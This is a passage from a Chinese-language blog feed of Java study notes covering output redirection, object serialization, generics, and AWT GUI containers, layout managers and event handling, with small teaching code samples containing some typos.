class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">....</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (Exception e)</span><br><span class="line">&#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong><code>e.printStackTrace();</code>默认是把错误信息输出到system.err所关联的设备中</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestSysl</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        PrintStream ps = <span class="keyword">new</span> PrintStream(<span class="string">&quot;d:/heihei.asd&quot;</span>);</span><br><span class="line">        System.setOut(ps);</span><br><span class="line">        System.out.println(<span class="string">&quot;哈哈&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="对象的序列化"><a href="#对象的序列化" class="headerlink" title="对象的序列化"></a>对象的序列化</h1><ul><li>所谓序列化是指：把一个Object对象直接转化为字节流，然后把这个字节流直接写入本地硬盘或网络中</li><li>如果要想把某个对象序列化，则必须的实现<code>Serializable接口</code><strong>（起标示作用）</strong></li><li>Serializable接口中并没有任何方法，这种类型的接口被称为标记接口，如果一个类实现了Serializable接口，潜在含义就是告诉编译器这个类是允许被序列化的，如果程序中存在序列该对象的代码，编译器就会自动进行相应的处理已完成该对象的序列化，如果该对象没有实现Serializable接口，程序中却存在该对象被序列化的代码，编译器编译时就会报错</li><li>在Java中transient修饰的成员变量在对象序列化时不被序列化 </li></ul><p>示例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestObjectlO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">implements</span> <span class="title">Serializable</span> //如果将<span class="keyword">implements</span> <span class="title">Serializable</span>注释掉，则程序编译时就会报错</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String sname = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> sid = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">transient</span> <span class="keyword">public</span> <span class="keyword">float</span> sscore = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//transient表示sscore成员不能被序列化</span></span><br><span class="line">    <span class="comment">//所谓不能被序列化就是指:“该成员调用ObjectOutputStream 的 writeOnbject()时不会被保存，调用ObjectInputStream的read0bject()方法时不会被读取”</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">(String name, <span class="keyword">int</span> id, <span class="keyword">float</span> score)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.sname = name;</span><br><span class="line">        <span class="keyword">this</span>.sid = id;</span><br><span class="line">        <span class="keyword">this</span>.sscore = score;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h1><ul><li>如何去除警告</li></ul><p><img src="/2021/04/19/Java-9%E6%B5%81/%E8%AD%A6%E5%91%8A.png"></p><ul><li>为什么有警告</li></ul><p>手册里，Iterator<E> 有个尖括号</E></p><ul><li>凡是带尖括号的，内部的数据可以是任意的</li><li>但可以指定具体运行某一次的传入数据的类型</li><li>有尖括号，不指定数据类型就会报错，指定数据类型增强安全性</li></ul><h2 id="泛型定义"><a href="#泛型定义" class="headerlink" title="泛型定义"></a>泛型定义</h2><p>泛型：限制指定某一时刻一个容器中可以传入的数据类型</p><p>泛型是用来限制传入容器、接口中的数据类型</p><p>例如</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Iterator&lt;Integer&gt; it = s.iterator();</span><br><span class="line"></span><br><span class="line">Comparable&lt;T&gt; 接口中有如下方法:</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">compareTo</span><span class="params">(T o)</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function">要想限制传入Comparable接口的数据类型，可以使用泛型</span></span><br><span class="line"><span class="function">class Student inplements Comparable&lt;Student&gt;</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ......</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compareTo</span><span class="params">(Student ob)</span> <span class="comment">//注意Student不能写成了Object</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    <strong>当指定了接口中传入的数据类型时，该接口要实现集成方法时形参不能写Object，只能写指定具体的类的名字</strong></p><p><strong>真正的泛型：无论这个数据怎样方式存储我们对他用同样的算法执行操作</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;流的定义&quot;&gt;&lt;a href=&quot;#流的定义&quot; class=&quot;headerlink&quot; title=&quot;流的定义&quot;&gt;&lt;/a&gt;流的定义&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;流就是程序和设备之间嫁接起来的一根用于数据传输的管道&lt;/strong&gt;，这个管道上有很多按钮,不</summary>
      
    
    
    
    <category term="Java" scheme="http://example.com/categories/Java/"/>
    
    
  </entry>
  
  <entry>
    <title>Java 8图形化界面</title>
    <link href="http://example.com/2021/04/18/Java-8%E5%9B%BE%E5%BD%A2%E5%8C%96%E7%95%8C%E9%9D%A2/"/>
    <id>http://example.com/2021/04/18/Java-8%E5%9B%BE%E5%BD%A2%E5%8C%96%E7%95%8C%E9%9D%A2/</id>
    <published>2021-04-18T13:58:45.000Z</published>
    <updated>2021-04-20T13:56:37.259Z</updated>
    
    <content type="html"><![CDATA[<h1 id="awt-图形化界面"><a href="#awt-图形化界面" class="headerlink" title="awt 图形化界面"></a>awt 图形化界面</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestCom</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">Frame f = <span class="keyword">new</span> Frame();</span><br><span class="line">        f.setSize(<span class="number">400</span>,<span class="number">400</span>);</span><br><span class="line">f.setBackground(Color.GREEN);</span><br><span class="line">        f.setVisible(<span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="GUI"><a href="#GUI" class="headerlink" title="GUI"></a>GUI</h1><h2 id="组件：给操作有反应"><a href="#组件：给操作有反应" class="headerlink" title="组件：给操作有反应"></a>组件：给操作有反应</h2><p>​    组件(Component)是图形用户界面的基本组成元素，<strong>凡是能够以图形化方式显示在屏幕上并能够与用户进行交互的对象均为组件</strong>，如菜单、按钮、标签、文本框、滚动条等。</p><p>组件分类<br>    <code>java.awt.Component</code><br>    <code>Java.awt.MenuComponent</code><br>    说明：抽象类java.awt.Component是除菜单相关组件之外所有JavaAWT组件类的根父类，该类规定了GUI组件的基本特性，如尺寸、位置和颜色效果等，并实现了作为一个GUI部件所应具备的基本功能</p><p><strong>我们主要学<code>component</code></strong></p><h2 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h2><ul><li>组件通常不能独立地显示出来，必须将组件放在一定的容器中才可以显示出来。</li><li>有一类特殊的组件是专门用来包含其他组件的，这类组件叫做容器，<code>java.awt.Container</code>是所有容器的父类，<code>java.awt.Container</code>继承自<code>java.awt.Component</code></li><li>容器类对象本身也是一个组件，具有组件的所有性质，但反过来组件却不一定是容器</li><li><strong>就比如ok按键（按钮是组件，组件要在显示器显示要放到容器），不能独立显示需要放到容器才能显示</strong></li></ul><p><img src="/2021/04/18/Java-8%E5%9B%BE%E5%BD%A2%E5%8C%96%E7%95%8C%E9%9D%A2/%E5%AE%B9%E5%99%A8%E5%92%8C%E7%BB%84%E4%BB%B6%E5%85%B3%E7%B3%BB.png"></p><h2 id="容器分布"><a href="#容器分布" class="headerlink" title="容器分布"></a>容器分布</h2><p>容器分布图</p><p><img src="/2021/04/18/Java-8%E5%9B%BE%E5%BD%A2%E5%8C%96%E7%95%8C%E9%9D%A2/%E5%AE%B9%E5%99%A8%E5%88%86%E5%B8%83%E5%9B%BE.png"></p><p><img src="/2021/04/18/Java-8%E5%9B%BE%E5%BD%A2%E5%8C%96%E7%95%8C%E9%9D%A2/%E4%BE%8B%E5%AD%90.png"></p><h2 id="Frame常用的方法"><a href="#Frame常用的方法" class="headerlink" title="Frame常用的方法"></a>Frame常用的方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setBounds</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> width, <span class="keyword">int</span> height)</span></span></span><br><span class="line"><span class="function">    设置窗体的位置和大小，x和y表示窗体左上角距离屏幕的水平和垂直距离,with和height是窗体本身的宽度和高度</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSize</span><span class="params">(<span class="keyword">int</span> width, <span class="keyword">int</span> height)</span></span></span><br><span class="line"><span class="function">设置窗体的大小，with和height是窗体本身的宽度和高度</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setVisible</span><span class="params">(<span class="keyword">boolean</span> flag)</span></span>;</span><br><span class="line">设置窗体是否可见，<span class="keyword">true</span>表示可见，<span class="keyword">false</span>表示不可见</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setBackground</span><span class="params">(Color c)</span></span></span><br><span class="line"><span class="function">设置窗体的背景色</span></span><br></pre></td></tr></table></figure><h2 id="Panel"><a href="#Panel" class="headerlink" title="Panel"></a>Panel</h2><ul><li> panel是容纳其他组件的组件</li><li>panel是容器</li><li>panel不能单独存在，必须得被添加到其他容器中</li></ul><p>Panel类拥有从其父类继承来的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">setBounds(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> width,<span class="keyword">int</span> height)</span><br><span class="line">setSize(<span class="keyword">int</span> width, <span class="keyword">int</span> height)</span><br><span class="line">setLocation( <span class="keyword">int</span> x,<span class="keyword">int</span> y)</span><br><span class="line">setBackground(Color c)</span><br><span class="line">setLayout(LayoutManager mgr)</span><br><span class="line">.....</span><br></pre></td></tr></table></figure><p>Panel的构造方法为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Panel() 使用默认的FlowLayout类布局管理器初始化。</span><br><span class="line">Panel(LayoutManager layout) 使用指定的布局管理器初始化。</span><br></pre></td></tr></table></figure><p>例子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestPanel_1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Frame f = <span class="keyword">new</span> Frame(<span class="string">&quot;Java Frame with Panel&quot;</span>);</span><br><span class="line">        Panel p = <span class="keyword">new</span> Panel();</span><br><span class="line">f.setLayout(<span class="keyword">null</span>);</span><br><span class="line">f.setBounds(<span class="number">300</span>,<span class="number">300</span>,<span class="number">500</span>,<span class="number">500</span>); <span class="comment">//Frame的设置是相对于整个屏幕</span></span><br><span class="line">        f.setBackground(<span class="keyword">new</span> Color(<span class="number">100</span>,<span class="number">100</span>,<span class="number">102</span>)); <span class="comment">//三个颜色</span></span><br><span class="line">        p.setBounds(<span class="number">300</span>/<span class="number">2</span>，<span class="number">300</span>/<span class="number">2</span>，<span class="number">500</span>/<span class="number">2</span>，<span class="number">500</span>/<span class="number">2</span>); </span><br><span class="line">        p.setBackground(<span class="keyword">new</span> Color(<span class="number">204</span>,<span class="number">204</span>, <span class="number">255</span>));</span><br><span class="line">f.add(p); <span class="comment">//这是java.awt.Container类中的一个方法</span></span><br><span class="line">        f.setvisible(<span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="布局管理器"><a href="#布局管理器" class="headerlink" title="布局管理器"></a>布局管理器</h2><ul><li><p>容器里的<strong>组件以什么方式排列组合</strong>，由布局管理器类来控制的</p></li><li><p>容器对其中所包含组件的排列方式，包括组件的位置和大小设定，被称为容器的布局(Layout)。</p></li><li><p>为了使图形用户界面具有良好的平台无关性，Java语言提供了布局管理器来管理容器的布局，而<strong>不建议直接设置组件在容器中的位置和尺寸</strong>。</p></li><li><p>每个容器都有一个默认的布局管理器，当容器需要对某个组件进行定位或判断其大小尺寸时，就会自动调用其对应的布局管理器。</p></li><li><p>在<strong>AWT</strong>中，常见的布局管理器：</p><ul><li>BorderLayout</li><li>FlowLayout</li><li>GridLayout</li></ul></li><li><p>使用 <code>f.setLayout(null);</code> 可以使默认的布局管理器失效</p></li></ul><h3 id="FlowLayout布局管理器"><a href="#FlowLayout布局管理器" class="headerlink" title="FlowLayout布局管理器"></a>FlowLayout布局管理器</h3><ul><li><p>FlowLayout是Panel类的默认布局管理器。</p><ul><li>FlowLayout布局管理器对组件逐行定位，行内从左到右，一行排满后换行。</li><li>不改变组件的大小，按组件原有尺寸显示组件，可设置不同的组件间距,行距以及对齐方式。</li></ul></li><li><p>FlowLayout布局管理器默认的<strong>对齐方式是居中</strong>。（流水排）</p></li></ul><p><img src="/2021/04/18/Java-8%E5%9B%BE%E5%BD%A2%E5%8C%96%E7%95%8C%E9%9D%A2/FlowLayout%E5%B8%83%E5%B1%80%E7%AE%A1%E7%90%86%E5%99%A8.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> FlowLayout(FlowLayout.RIGHT,<span class="number">20</span>,<span class="number">40</span>);</span><br><span class="line">右对齐，组件之间水平间距<span class="number">20</span>个像素，垂直间距<span class="number">40</span>个像素。</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> FlowLayout(FlowLayout.LEFT);</span><br><span class="line">左对齐，水平和垂直间距为缺省值（<span class="number">5</span>）。</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> FlowLayout();</span><br><span class="line">使用缺省的居中对齐方式，水平和垂直间距为缺省值（<span class="number">5</span>）。</span><br></pre></td></tr></table></figure><p>例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java. awt.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestFlowLayout</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Frame f = <span class="keyword">new</span> Frame(<span class="string">&quot;Flow Layout&quot;</span>);</span><br><span class="line">        Button buttonl = <span class="keyword">new</span> Button(<span class="string">&quot;ok&quot;</span>);</span><br><span class="line">        Button button2 = <span class="keyword">new</span> Button(<span class="string">&quot;0pen&quot;</span>);</span><br><span class="line">        Button button3 = <span class="keyword">new</span> Button(<span class="string">&quot;Ciose&quot;</span>);</span><br><span class="line">        f.setLayout(<span class="keyword">new</span> FlowLayout(FlowLayout.CENTER)); <span class="comment">//设置f为Flowlayout</span></span><br><span class="line">        f.ada(buttonl);</span><br><span class="line">        f.add(button2);</span><br><span class="line">        f.add(button3):</span><br><span class="line">        f.setSize(<span class="number">300</span>,<span class="number">400</span>);</span><br><span class="line">        f.setVisible(<span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第9行 f 默认的布局管理器是BorderLayout，这一行意思是定义一个Flowlayout，用Flowlayout对</p><p>象充当容器的布局管理器，f 默认的是BorderLayout，必须重新指定布局管理器</p><h3 id="BorderLayout布局管理器"><a href="#BorderLayout布局管理器" class="headerlink" title="BorderLayout布局管理器"></a>BorderLayout布局管理器</h3><ul><li>BorderLayout是Frame类的默认布局管理器。</li><li>BorderLayout将整个容器的布局划分成<ul><li>东（EAST)</li><li>西（WEST)</li><li>南（SOUTH)</li><li>北（NORTH)</li><li>中（CENTER)五个区域，组件只能被添加到指定的区域。</li></ul></li><li>如不指定组件的加入部位，则默认加入到CENTER区。</li><li>每个区域只能加入一个组件，如加入多个，则先前加入的会被覆盖。</li><li>BorderLayout型布局容器尺寸缩放原则：<ul><li>北、南两个区域在水平方向缩放。</li><li>东、西两个区域在垂直方向缩放。</li><li>中部可在两个方向上缩放。</li></ul></li></ul><p><img src="/2021/04/18/Java-8%E5%9B%BE%E5%BD%A2%E5%8C%96%E7%95%8C%E9%9D%A2/BorderLayout.png"></p><ul><li>东西南北的排列，默认放中间整个框这么大，会覆盖只显示最后一个</li></ul><p>例子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestBorderLayout</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Frame f;</span><br><span class="line">        f = <span class="keyword">new</span> Frame(<span class="string">&quot;Border Layout&quot;</span>);</span><br><span class="line">        Button bn = <span class="keyword">new</span> Button(<span class="string">&quot;BN&quot;</span>);</span><br><span class="line">        Button bs = <span class="keyword">new</span> Button(<span class="string">&quot;BS&quot;</span>);</span><br><span class="line">        Button bw = <span class="keyword">new</span> Button(<span class="string">&quot;BW&quot;</span>);</span><br><span class="line">        Button be = <span class="keyword">new</span> Button(<span class="string">&quot;BE&quot;</span>);</span><br><span class="line">        Button bc = <span class="keyword">new</span> Button(<span class="string">&quot;BC&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//也可使用下述语句</span></span><br><span class="line">        <span class="comment">//f.add(bn, BorderLayout.NORTH);</span></span><br><span class="line">        <span class="comment">//f.add(bs, BorderLayout.SOUTH);</span></span><br><span class="line">        <span class="comment">//f.add(bw, BorderLayout.WEST);</span></span><br><span class="line">        <span class="comment">//f.add(be，BorderLayout.EAST);</span></span><br><span class="line">        <span class="comment">//f.add(bc，BorderLayout.CENTER);</span></span><br><span class="line">        </span><br><span class="line">        f.setSize(<span class="number">200</span>,<span class="number">200</span>);</span><br><span class="line">        f.setvisible(<span class="keyword">true</span>);       </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="GridLayout布局管理器"><a href="#GridLayout布局管理器" class="headerlink" title="GridLayout布局管理器"></a>GridLayout布局管理器</h3><ul><li>GridLayout型布局管理器将空间划分成规则的<strong>矩形网格</strong>，每个单元格区域大小相等。组件被添加到每个单元格中，先从左到右添满一行后换行，再从上到下。</li><li>在GridLayout构造方法中指定分割的行数和列数：<ul><li>如: GridLayout(3,4)</li><li><strong>GridLayout是以行数为准的（格子排列）</strong></li></ul></li></ul><p><img src="/2021/04/18/Java-8%E5%9B%BE%E5%BD%A2%E5%8C%96%E7%95%8C%E9%9D%A2/GridLayout.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">GridLayout的构造函数</span></span><br><span class="line"><span class="comment">public GriLayout(int, int);的用法</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">import</span> java. awt.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestGridLayout</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Frame f = <span class="function">now <span class="title">Frame</span><span class="params">(<span class="string">&quot;GridLayout Example&quot;</span>)</span></span>;</span><br><span class="line">        Button b1 = <span class="keyword">new</span> Button(<span class="string">&quot;b1&quot;</span>);</span><br><span class="line">        Button b2 = <span class="keyword">new</span> Button(<span class="string">&quot;b2&quot;</span>);</span><br><span class="line">        Button b3 = <span class="keyword">new</span> Button(<span class="string">&quot;b3&quot;</span>);</span><br><span class="line">        Button b4 = <span class="keyword">new</span> Button(<span class="string">&quot;b4&quot;</span>);</span><br><span class="line">        Button b5 = <span class="keyword">new</span> Button(<span class="string">&quot;b5&quot;</span>);</span><br><span class="line">        <span class="comment">//Button b6 = new Button(&quot;b6&quot;);</span></span><br><span class="line">        </span><br><span class="line">        f.setLayout(<span class="keyword">new</span> GridLayout(<span class="number">2</span>,<span class="number">3</span>)); <span class="comment">//第一个参数是多少，则输出的就是多少行，列数是编译器根据行数自动计算出来的 (行数是一定的，但是列数不一定)</span></span><br><span class="line">     </span><br><span class="line">        f.add(b1);</span><br><span class="line">    f.add(b2);</span><br><span class="line">        f.add(b3);</span><br><span class="line">        f.add(b4);</span><br><span class="line">        f.add(b5);</span><br><span class="line">        <span class="comment">//f.add(b6);</span></span><br><span class="line">        </span><br><span class="line">    f.pack(); <span class="comment">//如果把该语句注释掉，则输出结果就变成一个只有标题的小窗口，摘自API: “pack() – 类 java.awt.Window 中的方法，调整此窗口的大小，以适合其子组件的首选大小和布局”，郝斌:也就是把子组件包括起来，会根据它所容纳的子组件的大小自动调整自身的大小，把子组件包括起来</span></span><br><span class="line">        f.setVisible(<span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="布局管理器总结"><a href="#布局管理器总结" class="headerlink" title="布局管理器总结"></a>布局管理器总结</h3><ul><li>Frame是一个顶级窗口，Frame的缺省布局管理器为BorderLayout</li><li>Panel无法单独显示，必须添溯到某个容器中。<ul><li><strong>Panel的缺省布局管理器为FlowLayout。</strong></li></ul></li><li>当把Panel作为一个组件添加到某个容器中后，该Panel仍然可以有自己的布局管理器。</li><li>使用布局管理器时，布局管理器负责各个组件的大小和位置，因此用户无法在这种情况下设置组件天小和位置属性，如果试图使用Java语言提供的<code>setLocation()</code>，<code>setSize()</code>，<code>setBounds()</code>等方法，则都会被布局管理器覆盖。</li><li>如果用户确实需要亲自设置组件大小或位置，则应取消该容器的布局管理器，方法为：<ul><li><code>setLayout(null)</code></li></ul></li></ul><h1 id="事件处理-（点击按钮有反应）"><a href="#事件处理-（点击按钮有反应）" class="headerlink" title="事件处理 （点击按钮有反应）"></a>事件处理 （点击按钮有反应）</h1><h2 id="事件处理相关概念"><a href="#事件处理相关概念" class="headerlink" title="事件处理相关概念"></a>事件处理相关概念</h2><ul><li>事件(Event)<ul><li>用户对组件的一个操作,称之为一个事件</li></ul></li><li>事件源(Event Source)<ul><li>能够产生事件的GUI组件对象，如按钮、文本框等。</li></ul></li><li>事件处理方法(Event Handler)<ul><li>能够接收、解析和处理事件类对象,实现与用户交互功能的方法。</li></ul></li><li>事件监听器(Event Listener) 【<strong>用户是否点击，调用事件处理方法</strong>】<ul><li>可以处理事件的一个类。</li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td 